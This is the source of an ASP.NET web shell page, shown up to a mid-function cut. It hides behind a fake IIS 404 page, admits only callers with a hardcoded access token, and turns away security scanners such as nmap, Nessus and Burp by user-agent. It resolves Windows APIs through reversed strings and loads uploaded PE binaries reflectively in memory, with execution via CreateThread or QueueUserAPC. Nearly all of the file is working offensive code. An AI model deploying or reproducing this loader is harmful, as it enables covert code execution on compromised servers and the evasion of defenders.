<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Collections.Generic" %>

<script runat="server">
   

    static readonly string[] ALLOWED_HOSTS = new string[] {
        "localhost",
        "anotherhostname.local"
    };

    const string ACCESS_TOKEN = "0xsp.com";

    static readonly string[] ALLOWED_IPS = new string[] { 
      "10.10.10.50" //attacker machine IPs 

    };

   // by default it is disabled, but ensure to turn these on based on your testing needs. 
    const bool ENFORCE_HOST_CHECK = false;
    const bool ENFORCE_IP_CHECK = false; 

    private bool ValidateAccess()
    {
        string token = Request.QueryString["k"];
        if (string.IsNullOrEmpty(token))
            token = Request.Headers["X-Auth-Token"];

        if (string.IsNullOrEmpty(token) || token != ACCESS_TOKEN)
        {
            Send404();
            return false;
        }

        if (ENFORCE_HOST_CHECK && ALLOWED_HOSTS.Length > 0)
        {
            string host = Request.Url.Host.ToLower();
            bool hostMatch = false;
            foreach (string h in ALLOWED_HOSTS)
            {
                if (host == h.ToLower()) { hostMatch = true; break; }
            }
            if (!hostMatch) { Send404(); return false; }
        }

        if (ENFORCE_IP_CHECK && ALLOWED_IPS.Length > 0)
        {
            string clientIp = Request.ServerVariables["REMOTE_ADDR"];
            string forwardedFor = Request.Headers["X-Forwarded-For"];
            if (!string.IsNullOrEmpty(forwardedFor))
                clientIp = forwardedFor.Split(',')[0].Trim();

            bool ipMatch = false;
            foreach (string ip in ALLOWED_IPS)
            {
                if (clientIp == ip) { ipMatch = true; break; }
            }
            if (!ipMatch) { Send404(); return false; }
        }

        string ua = (Request.UserAgent ?? "").ToLower();
        string[] ba = new string[] { //this is just default list, remove it or change it, the purpose behind it is to kickout known scanning user-agents
            "nessus", "openvas", "masscan",
            "zgrab", "gobuster", "python", "curl", "burp",
            "qualys", "nmap", "acunetix", "nuclei", "httpx"
        };
        foreach (string b in ba)
        {
            if (ua.Contains(b)) { Send404(); return false; }
        }

        return true;
    }

    private void Send404() // fake page ( design + response code)
    {
        Response.Clear();
        Response.StatusCode = 404;
        Response.StatusDescription = "Not Found";
        Response.ContentType = "text/html";
        Response.Write("<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n");
        Response.Write("<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n");
        Response.Write("<title>404 - File or directory not found.</title>\r\n");
        Response.Write("<style type=\"text/css\">body{margin:0;font-size:.7em;font-family:Verdana,Arial,Helvetica,sans-serif;background:#EEEEEE;}");
        Response.Write("fieldset{padding:0 15px 10px 15px;}h1{font-size:2.4em;margin:0;color:#FFF;}");
        Response.Write("h2{font-size:1.7em;margin:0;color:#CC0000;}h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}");
        Response.Write("#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\",Verdana,sans-serif;color:#FFF;background-color:#555555;}");
        Response.Write("#content{margin:0 0 0 2%;position:relative;}</style>\r\n</head>\r\n<body>\r\n");
        Response.Write("<div id=\"header\"><h1>Server Error</h1></div>\r\n");
        Response.Write("<div id=\"content\">\r\n<div class=\"content-container\">\r\n");
        Response.Write("<fieldset><h2>404 - File or directory not found.</h2>\r\n");
        Response.Write("<h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>\r\n");
        Response.Write("</fieldset></div></div>\r\n</body>\r\n</html>");
        Response.End();
    }

  
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr LoadLibrary(string n);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr h, string n);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr h, IntPtr n);


    static string _d(string s)
    {
        char[] c = s.ToCharArray();
        Array.Reverse(c);
        return new string(c);
    }

  
    static uint _MC { get { return (uint)(1 << 12); } }                     // 0x1000
    static uint _MR { get { return (uint)(1 << 13); } }                     // 0x2000
    static uint _MF { get { return (uint)(1 << 15); } }                     // 0x8000
    static uint _PRW { get { return (uint)4; } }                            // 0x04
    static uint _PER { get { return (uint)(1 << 5); } }                     // 0x20
    static uint _PERW { get { return (uint)(1 << 6); } }                    // 0x40
    static uint _PRO { get { return (uint)2; } }                            // 0x02

 
    delegate IntPtr D_VA(IntPtr a, UIntPtr s, uint t, uint p);
    delegate bool D_VF(IntPtr a, UIntPtr s, uint t);
    delegate bool D_VP(IntPtr a, UIntPtr s, uint p, out uint o);
    delegate bool D_FIC(IntPtr h, IntPtr a, UIntPtr s);
    delegate IntPtr D_GCP();
    delegate uint D_GLE();
    delegate bool D_FL(IntPtr h);
    delegate IntPtr D_CT(IntPtr sa, UIntPtr ss, IntPtr fn, IntPtr p, uint f, out uint id);
    delegate uint D_WFSO(IntPtr h, uint ms);
    delegate bool D_GECT(IntPtr h, out uint c);
    delegate bool D_CH(IntPtr h);
    delegate IntPtr D_OT(uint a, bool i, uint id);
    delegate uint D_QUAPC(IntPtr f, IntPtr t, IntPtr d);
    delegate uint D_GCTI();
    delegate uint D_SE(uint ms, bool al);
    delegate bool D_RAFT(IntPtr ft, uint cnt, ulong ba);
    delegate bool D_RDFT(IntPtr ft);

    static IntPtr _hK = IntPtr.Zero;
    static IntPtr _hN = IntPtr.Zero;

    static IntPtr HK()
    {
        if (_hK == IntPtr.Zero)
            _hK = LoadLibrary(_d("lld.23lenrek"));  
        return _hK;
    }

    static IntPtr HN()
    {
        if (_hN == IntPtr.Zero)
            _hN = LoadLibrary(_d("lld.lldtn"));     
        return _hN;
    }

    static T _r<T>(IntPtr mod, string reversedName) where T : class
    {
        IntPtr p = GetProcAddress(mod, _d(reversedName));
        if (p == IntPtr.Zero) return null;
        return (T)(object)Marshal.GetDelegateForFunctionPointer(p, typeof(T));
    }

   
    static D_VA _pVA;
    static D_VF _pVF;
    static D_VP _pVP;
    static D_FIC _pFIC;
    static D_GCP _pGCP;
    static D_GLE _pGLE;
    static D_FL _pFL;
    static D_CT _pCT;
    static D_WFSO _pWFSO;
    static D_GECT _pGECT;
    static D_CH _pCH;
    static D_OT _pOT;
    static D_QUAPC _pQUAPC;
    static D_GCTI _pGCTI;
    static D_SE _pSE;
    static D_RAFT _pRAFT;
    static D_RDFT _pRDFT;

   
    static D_VA pVA() { if (_pVA == null) _pVA = _r<D_VA>(HK(), "collAlautriV"); return _pVA; }
    static D_VF pVF() { if (_pVF == null) _pVF = _r<D_VF>(HK(), "eerFlautriV"); return _pVF; }
    static D_VP pVP() { if (_pVP == null) _pVP = _r<D_VP>(HK(), "tcetorPlautriV"); return _pVP; }
    static D_FIC pFIC() { if (_pFIC == null) _pFIC = _r<D_FIC>(HK(), "ehcaCnoitcurtsnIhsulF"); return _pFIC; }
    static D_GCP pGCP() { if (_pGCP == null) _pGCP = _r<D_GCP>(HK(), "ssecorPtnerruCteG"); return _pGCP; }
    static D_GLE pGLE() { if (_pGLE == null) _pGLE = _r<D_GLE>(HK(), "rorrEtsaLteG"); return _pGLE; }
    static D_FL pFL() { if (_pFL == null) _pFL = _r<D_FL>(HK(), "yrarbiLeerF"); return _pFL; }
    static D_CT pCT() { if (_pCT == null) _pCT = _r<D_CT>(HK(), "daerhTetaerC"); return _pCT; }
    static D_WFSO pWFSO() { if (_pWFSO == null) _pWFSO = _r<D_WFSO>(HK(), "tcejbOelgniSroFtiaW"); return _pWFSO; }
    static D_GECT pGECT() { if (_pGECT == null) _pGECT = _r<D_GECT>(HK(), "daerhTedoCtixEteG"); return _pGECT; }
    static D_CH pCH() { if (_pCH == null) _pCH = _r<D_CH>(HK(), "eldnaHesolC"); return _pCH; }
    static D_OT pOT() { if (_pOT == null) _pOT = _r<D_OT>(HK(), "daerhTnepO"); return _pOT; }
    static D_QUAPC pQUAPC() { if (_pQUAPC == null) _pQUAPC = _r<D_QUAPC>(HK(), "CPAresUeueuQ"); return _pQUAPC; }
    static D_GCTI pGCTI() { if (_pGCTI == null) _pGCTI = _r<D_GCTI>(HK(), "dIdaerhTtnerruCteG"); return _pGCTI; }
    static D_SE pSE() { if (_pSE == null) _pSE = _r<D_SE>(HK(), "xEpeelS"); return _pSE; }
    static D_RAFT pRAFT() { if (_pRAFT == null) _pRAFT = _r<D_RAFT>(HN(), "elbaTnoitcnuFddAltR"); return _pRAFT; }
    static D_RDFT pRDFT() { if (_pRDFT == null) _pRDFT = _r<D_RDFT>(HN(), "elbaTnoitcnuFeteleDltR"); return _pRDFT; }

   
    const ushort _DOSSIG = 0x5A4D;
    const uint _NTSIG = 0x00004550;
    const ushort _M386 = 0x014c;
    const ushort _M64 = 0x8664;
    const int _DEXPORT = 0;
    const int _DIMPORT = 1;
    const int _DEXCEPT = 3;
    const int _DRELOC = 5;
    const int _DTLS = 9;
    const int _DDELAY = 13;
    const ushort _RELHIGH = 3;
    const ushort _RELDIR64 = 10;
    const uint _ORDFLAG32 = 0x80000000;
    const ulong _ORDFLAG64 = 0x8000000000000000;

    static uint _SE_X { get { return (uint)(0x20 << 24); } }   // 0x20000000
    static uint _SE_R { get { return (uint)(0x40 << 24); } }   // 0x40000000
    static uint _SE_W { get { return (uint)((uint)0x80 << 24); } }   // 0x80000000

   
    [UnmanagedFunctionPointer(CallingConvention.Cdecl, SetLastError = false)]
    [System.Security.SuppressUnmanagedCodeSecurity]
    delegate void FnVV();

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = false)]
    [System.Security.SuppressUnmanagedCodeSecurity]
    delegate void FnVVS();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl, SetLastError = false)]
    [System.Security.SuppressUnmanagedCodeSecurity]
    delegate int FnIV();

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = false)]
    [System.Security.SuppressUnmanagedCodeSecurity]
    delegate int FnIVS();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl, SetLastError = false)]
    [System.Security.SuppressUnmanagedCodeSecurity]
    delegate IntPtr FnPV();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl, SetLastError = false)]
    [System.Security.SuppressUnmanagedCodeSecurity]
    delegate int FnIP(IntPtr a);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl, SetLastError = false)]
    [System.Security.SuppressUnmanagedCodeSecurity]
    delegate void FnVP(IntPtr a);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl, SetLastError = false)]
    [System.Security.SuppressUnmanagedCodeSecurity]
    delegate IntPtr FnPP(IntPtr a);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = false)]
    [System.Security.SuppressUnmanagedCodeSecurity]
    delegate uint FnTP(IntPtr p);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void FnTLS(IntPtr h, uint r, IntPtr res);

    // PE Structures
    [StructLayout(LayoutKind.Sequential)]
    struct S_DOS
    {
        public ushort e_magic;
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] e_res;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2;
        public int e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_FH
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_DD
    {
        public uint VirtualAddress;
        public uint Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_OH32
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public uint BaseOfData;
        public uint ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public uint SizeOfStackReserve;
        public uint SizeOfStackCommit;
        public uint SizeOfHeapReserve;
        public uint SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public S_DD[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_OH64
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public ulong SizeOfStackReserve;
        public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve;
        public ulong SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public S_DD[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_SH
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint VirtualSize;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_ED
    {
        public uint Characteristics;
        public uint TimeDateStamp;
        public ushort MajorVersion;
        public ushort MinorVersion;
        public uint Name;
        public uint Base;
        public uint NumberOfFunctions;
        public uint NumberOfNames;
        public uint AddressOfFunctions;
        public uint AddressOfNames;
        public uint AddressOfNameOrdinals;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_BR
    {
        public uint VirtualAddress;
        public uint SizeOfBlock;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_ID
    {
        public uint OriginalFirstThunk;
        public uint TimeDateStamp;
        public uint ForwarderChain;
        public uint Name;
        public uint FirstThunk;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_TLS32
    {
        public uint StartAddressOfRawData;
        public uint EndAddressOfRawData;
        public uint AddressOfIndex;
        public uint AddressOfCallBacks;
        public uint SizeOfZeroFill;
        public uint Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_TLS64
    {
        public ulong StartAddressOfRawData;
        public ulong EndAddressOfRawData;
        public ulong AddressOfIndex;
        public ulong AddressOfCallBacks;
        public uint SizeOfZeroFill;
        public uint Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_RF
    {
        public uint BeginAddress;
        public uint EndAddress;
        public uint UnwindData;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct S_DLD
    {
        public uint Attributes;
        public uint DllNameRVA;
        public uint ModuleHandleRVA;
        public uint ImportAddressTableRVA;
        public uint ImportNameTableRVA;
        public uint BoundImportAddressTableRVA;
        public uint UnloadInformationTableRVA;
        public uint TimeDateStamp;
    }

    class ModInfo
    {
        public IntPtr Base;
        public uint Size;
        public bool Is64;
        public IntPtr EP;
        public List<IntPtr> Libs = new List<IntPtr>();
        public IntPtr ExTbl;
        public uint ExTblSz;
        public bool ExTblReg;
        public List<S_SH> Sects = new List<S_SH>();
    }

    ModInfo _mod = null;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!ValidateAccess())
            return;

        if (!IsPostBack)
        {
            ddlSignature.Items.Clear();
            ddlSignature.Items.Add(new ListItem("void func(void) [cdecl]", "void_void_cdecl"));
            ddlSignature.Items.Add(new ListItem("void func(void) [stdcall]", "void_void_stdcall"));
            ddlSignature.Items.Add(new ListItem("int func(void) [cdecl]", "int_void_cdecl"));
            ddlSignature.Items.Add(new ListItem("int func(void) [stdcall]", "int_void_stdcall"));
            ddlSignature.Items.Add(new ListItem("char* func(void) [cdecl]", "string_void_cdecl"));
            ddlSignature.Items.Add(new ListItem("int func(char*) [cdecl]", "int_string_cdecl"));
            ddlSignature.Items.Add(new ListItem("void func(char*) [cdecl]", "void_string_cdecl"));
            ddlSignature.Items.Add(new ListItem("char* func(char*) [cdecl]", "string_string_cdecl"));
            ddlSignature.Items.Add(new ListItem("DWORD WINAPI func(LPVOID) [stdcall]", "threadproc"));
            ddlSignature.Items.Add(new ListItem("Execute via CreateThread [RECOMMENDED]", "thread_execute"));
            ddlSignature.Items.Add(new ListItem("Execute via QueueUserAPC", "apc_execute"));
        }
    }

    ModInfo MapModule(byte[] raw, StringBuilder log)
    {
        ModInfo m = new ModInfo();

        if (raw.Length < Marshal.SizeOf(typeof(S_DOS)))
            throw new Exception("Data too small...");

        GCHandle pin = GCHandle.Alloc(raw, GCHandleType.Pinned);
        try
        {
            IntPtr pData = pin.AddrOfPinnedObject();
            S_DOS dos = (S_DOS)Marshal.PtrToStructure(pData, typeof(S_DOS));

            if (dos.e_magic != _DOSSIG)
                throw new Exception("Invalid header signature");

            int ntOff = dos.e_lfanew;
            if (ntOff + 4 > raw.Length)
            {
                throw new Exception("Header offset out of bounds <: ");
            }

            uint ntSig = BitConverter.ToUInt32(raw, ntOff);
            if (ntSig != _NTSIG)
            {
                throw new Exception("Invalid NT signature");
            }

            int fhOff = ntOff + 4;
            S_FH fh = (S_FH)Marshal.PtrToStructure(IntPtr.Add(pData, fhOff), typeof(S_FH));

            m.Is64 = (fh.Machine == _M64);
            log.AppendLine("Arch: " + (m.Is64 ? "x64" : "x86"));
            log.AppendLine("Sections: " + fh.NumberOfSections);

            int ohOff = fhOff + Marshal.SizeOf(typeof(S_FH));
            uint szImg, szHdr;
            ulong prefBase;
            uint epRva;
            S_DD[] dd;

            if (m.Is64)
            {
                S_OH64 oh = (S_OH64)Marshal.PtrToStructure(IntPtr.Add(pData, ohOff), typeof(S_OH64));
                szImg = oh.SizeOfImage; szHdr = oh.SizeOfHeaders;
                prefBase = oh.ImageBase; epRva = oh.AddressOfEntryPoint;
                dd = oh.DataDirectory;
            }
            else
            {
                S_OH32 oh = (S_OH32)Marshal.PtrToStructure(IntPtr.Add(pData, ohOff), typeof(S_OH32));
                szImg = oh.SizeOfImage; szHdr = oh.SizeOfHeaders;
                prefBase = oh.ImageBase; epRva = oh.AddressOfEntryPoint;
                dd = oh.DataDirectory;
            }

            log.AppendLine("Image size: 0x" + szImg.ToString("X"));
            log.AppendLine("Preferred base: 0x" + prefBase.ToString("X"));
            log.AppendLine("EP RVA: 0x" + epRva.ToString("X"));

            bool proc64 = IntPtr.Size == 8;
            log.AppendLine("Process: " + (proc64 ? "x64" : "x86"));
            if (proc64 != m.Is64)
            {
                throw new Exception("Architecture mismatch: module is " + (m.Is64 ? "x64" : "x86") +
                    " but host is " + (proc64 ? "x64" : "x86"));
            }

            m.Base = pVA()(IntPtr.Zero, (UIntPtr)szImg, _MC | _MR, _PERW);
            if (m.Base == IntPtr.Zero)
                throw new Exception("Memory allocation failed: " + pGLE()());

            m.Size = szImg;
            log.AppendLine("Mapped at: 0x" + m.Base.ToString("X"));

            Marshal.Copy(raw, 0, m.Base, (int)szHdr);

            int shOff = ohOff + fh.SizeOfOptionalHeader;
            int shSz = Marshal.SizeOf(typeof(S_SH));

            for (int i = 0; i < fh.NumberOfSections; i++)
            {
                S_SH sec = (S_SH)Marshal.PtrToStructure(
                    IntPtr.Add(pData, shOff + (i * shSz)), typeof(S_SH));

                string sn = Encoding.ASCII.GetString(sec.Name).TrimEnd('\0');
                log.AppendLine("  " + sn + " VA:0x" + sec.VirtualAddress.ToString("X") +
                    " Sz:0x" + sec.SizeOfRawData.ToString("X"));

                if (sec.SizeOfRawData > 0)
                {
                    IntPtr dst = IntPtr.Add(m.Base, (int)sec.VirtualAddress);
                    Marshal.Copy(raw, (int)sec.PointerToRawData, dst, (int)sec.SizeOfRawData);
                }
                m.Sects.Add(sec);
            }

            long delta = (long)m.Base - (long)prefBase;
            if (delta != 0)
            {
                log.AppendLine("Reloc delta: 0x" + delta.ToString("X"));
                DoRelocs(m, dd[_DRELOC], delta, log);
            }

            DoImports(m, dd[_DIMPORT], log);
            DoDelayImports(m, dd[_DDELAY], log);

            if (m.Is64)
                DoExcept(m, dd[_DEXCEPT], log);

            DoTls(m, dd[_DTLS], log);
            DoProtect(m, log);

            if (epRva != 0)
            {
                m.EP = IntPtr.Add(m.Base, (int)epRva);
                log.AppendLine("EP: 0x" + m.EP.ToString("X"));
            }

            pFIC()(pGCP()(), m.Base, (UIntPtr)szImg);

            if (m.EP != IntPtr.Zero)
            {
                log.AppendLine("Initializing CRT...");
                try { InvokeEP(m, 1, log); }
                catch (Exception ex) { log.AppendLine("Init warning: " + ex.Message); }
            }

            return m;
        }
        finally
        {
            pin.Free();
        }
    }

    void DoRelocs(ModInfo m, S_DD dir, long delta, StringBuilder log)
    {
        if (dir.VirtualAddress == 0 || dir.Size == 0) { log.AppendLine("No relocations"); return; }

        IntPtr rb = IntPtr.Add(m.Base, (int)dir.VirtualAddress);
        uint cnt = 0;
        int off = 0;

        while (off < dir.Size)
        {
            S_BR blk = (S_BR)Marshal.PtrToStructure(IntPtr.Add(rb, off), typeof(S_BR));
            if (blk.SizeOfBlock == 0) break;

            int n = (int)(blk.SizeOfBlock - 8) / 2;
            int eo = off + 8;

            for (int i = 0; i < n; i++)
            {
                ushort entry = (ushort)Marshal.ReadInt16(IntPtr.Add(rb, eo + (i * 2)));
                int type = entry >> 12;
                int ro = entry & 0xFFF;

                if (type == _RELHIGH)
                {
                    IntPtr pa = IntPtr.Add(m.Base, (int)blk.VirtualAddress + ro);
                    Marshal.WriteInt32(pa, (int)(Marshal.ReadInt32(pa) + delta));
                    cnt++;
                }
                else if (type == _RELDIR64)
                {
                    IntPtr pa = IntPtr.Add(m.Base, (int)blk.VirtualAddress + ro);
                    Marshal.WriteInt64(pa, Marshal.ReadInt64(pa) + delta);
                    cnt++;
                }
            }
            off += (int)blk.SizeOfBlock;
        }
        log.AppendLine("Relocations: " + cnt);
    }

    void DoImports(ModInfo m, S_DD dir, StringBuilder log)
    {
        if (dir.VirtualAddress == 0 || dir.Size == 0) { log.AppendLine("No imports"); return; }

        IntPtr ib = IntPtr.Add(m.Base, (int)dir.VirtualAddress);
        int dsz = Marshal.SizeOf(typeof(S_ID));
        int off = 0;

        while (true)
        {
            S_ID desc = (S_ID)Marshal.PtrToStructure(IntPtr.Add(ib, off), typeof(S_ID));
            if (desc.Name == 0) break;

            string dn = Marshal.PtrToStringAnsi(IntPtr.Add(m.Base, (int)desc.Name));
            log.AppendLine("Import: " + dn);

            IntPtr hDll = LoadLibrary(dn);
            if (hDll == IntPtr.Zero)
                throw new Exception("Failed to load: " + dn);

            m.Libs.Add(hDll);

            uint tr = desc.OriginalFirstThunk != 0 ? desc.OriginalFirstThunk : desc.FirstThunk;
            IntPtr ta = IntPtr.Add(m.Base, (int)desc.FirstThunk);
            IntPtr ota = IntPtr.Add(m.Base, (int)tr);
            int tsz = m.Is64 ? 8 : 4;
            int to = 0;

            while (true)
            {
                ulong tv;
                if (m.Is64) tv = (ulong)Marshal.ReadInt64(IntPtr.Add(ota, to));
                else tv = (uint)Marshal.ReadInt32(IntPtr.Add(ota, to));

                if (tv == 0) break;

                IntPtr fa;
                bool isOrd = m.Is64 ? (tv & _ORDFLAG64) != 0 : (tv & _ORDFLAG32) != 0;

                if (isOrd)
                {
                    fa = GetProcAddress(hDll, (IntPtr)(tv & 0xFFFF));
                }
                else
                {
                    IntPtr hna = IntPtr.Add(m.Base, (int)(tv & 0x7FFFFFFF));
                    string fn = Marshal.PtrToStringAnsi(IntPtr.Add(hna, 2));
                    fa = GetProcAddress(hDll, fn);
                }

                if (fa == IntPtr.Zero)
                    throw new Exception("Unresolved import from " + dn);

                if (m.Is64) Marshal.WriteInt64(IntPtr.Add(ta, to), (long)fa);
                else Marshal.WriteInt32(IntPtr.Add(ta, to), (int)fa);

                to += tsz;
            }
            off += dsz;
        }
    }

    void DoDelayImports(ModInfo m, S_DD dir, StringBuilder log)
    {
        if (dir.VirtualAddress == 0 || dir.Size == 0) { log.AppendLine("No delay imports"); return; }

        IntPtr dib = IntPtr.Add(m.Base, (int)dir.VirtualAddress);
        int dsz = Marshal.SizeOf(typeof(S_DLD));
        int off = 0;
        int pc = 0;

        while (true)
        {
            S_DLD desc = (S_DLD)Marshal.PtrToStructure(IntPtr.Add(dib, off), typeof(S_DLD));
            if (desc.DllNameRVA == 0) break;

            string dn = Marshal.PtrToStringAnsi(IntPtr.Add(m.Base, (int)desc.DllNameRVA));
            log.AppendLine("Delay: " + dn);

            IntPtr hDll = LoadLibrary(dn);
            if (hDll == IntPtr.Zero) { off += dsz; continue; }
            m.Libs.Add(hDll);

            if (desc.ModuleHandleRVA != 0)
            {
                IntPtr mha = IntPtr.Add(m.Base, (int)desc.ModuleHandleRVA);
                if (m.Is64) Marshal.WriteInt64(mha, (long)hDll);
                else Marshal.WriteInt32(mha, (int)hDll);
            }

            if (desc.ImportAddressTableRVA != 0 && desc.ImportNameTableRVA != 0)
            {
                IntPtr ia = IntPtr.Add(m.Base, (int)desc.ImportAddressTableRVA);
                IntPtr ina = IntPtr.Add(m.Base, (int)desc.ImportNameTableRVA);
                int tsz = m.Is64 ? 8 : 4;
                int to = 0;

                while (true)
                {
                    ulong tv;
                    if (m.Is64) tv = (ulong)Marshal.ReadInt64(IntPtr.Add(ina, to));
                    else tv = (uint)Marshal.ReadInt32(IntPtr.Add(ina, to));

                    if (tv == 0) break;

                    IntPtr fa;
                    bool isOrd = m.Is64 ? (tv & _ORDFLAG64) != 0 : (tv & _ORDFLAG32) != 0;

                    if (isOrd) fa = GetProcAddress(hDll, (IntPtr)(tv & 0xFFFF));
                    else
                    {
                        IntPtr hna = IntPtr.Add(m.Base, (int)(tv & 0x7FFFFFFF));
                        string fn = Marshal.PtrToStringAnsi(IntPtr.Add(hna, 2));
                        fa = GetProcAddress(hDll, fn);
                    }

                    if (fa != IntPtr.Zero)
                    {
                        if (m.Is64) Marshal.WriteInt64(IntPtr.Add(ia, to), (long)fa);
                        else Marshal.WriteInt32(IntPtr.Add(ia, to), (int)fa);
                        pc++;
                    }
                    to += tsz;
                }
            }
            off += dsz;
        }
        log.AppendLine("Delay entries: " + pc);
    }

    void DoExcept(ModInfo m, S_DD dir, StringBuilder log)
    {
        if (dir.VirtualAddress == 0 || dir.Size == 0) { log.AppendLine("No exception data"); return; }

        int rfsz = Marshal.SizeOf(typeof(S_RF));
        uint cnt = dir.Size / (uint)rfsz;
        if (cnt == 0) return;

        m.ExTbl = IntPtr.Add(m.Base, (int)dir.VirtualAddress);
        m.ExTblSz = cnt;

        bool ok = pRAFT()(m.ExTbl, cnt, (ulong)m.Base);
        if (ok) { m.ExTblReg = true; log.AppendLine("Exception handlers: " + cnt); }
        else { log.AppendLine("Exception handler registration failed"); }
    }

    void DoTls(ModInfo m, S_DD dir, StringBuilder log)
    {
        if (dir.VirtualAddress == 0 || dir.Size == 0) { log.AppendLine("No TLS"); return; }

        IntPtr ta = IntPtr.Add(m.Base, (int)dir.VirtualAddress);
        int cnt = 0;

        if (m.Is64)
        {
            S_TLS64 tls = (S_TLS64)Marshal.PtrToStructure(ta, typeof(S_TLS64));
            if (tls.AddressOfCallBacks != 0)
            {
                IntPtr cp = (IntPtr)(long)tls.AddressOfCallBacks;
                int o = 0;
                while (true)
                {
                    long ca = Marshal.ReadInt64(cp, o);
                    if (ca == 0) break;
                    try
                    {
                        var cb = (FnTLS)Marshal.GetDelegateForFunctionPointer((IntPtr)ca, typeof(FnTLS));
                        cb(m.Base, 1, IntPtr.Zero);
                        cnt++;
                    }
                    catch (Exception ex) { log.AppendLine("TLS error: " + ex.Message); }
                    o += 8;
                }
            }
        }
        else
        {
            S_TLS32 tls = (S_TLS32)Marshal.PtrToStructure(ta, typeof(S_TLS32));
            if (tls.AddressOfCallBacks != 0)
            {
                IntPtr cp = (IntPtr)tls.AddressOfCallBacks;
                int o = 0;
                while (true)
                {
                    int ca = Marshal.ReadInt32(cp, o);
                    if (ca == 0) break;
                    try
                    {
                        var cb = (FnTLS)Marshal.GetDelegateForFunctionPointer((IntPtr)ca, typeof(FnTLS));
                        cb(m.Base, 1, IntPtr.Zero);
                        cnt++;
                    }
                    catch (Exception ex) { log.AppendLine("TLS error: " + ex.Message); }
                    o += 4;
                }
            }
        }
        log.AppendLine("TLS callbacks: " + cnt);
    }

    void DoProtect(ModInfo m, StringBuilder log)
    {
        log.AppendLine("Applying protections...");
        foreach (var sec in m.Sects)
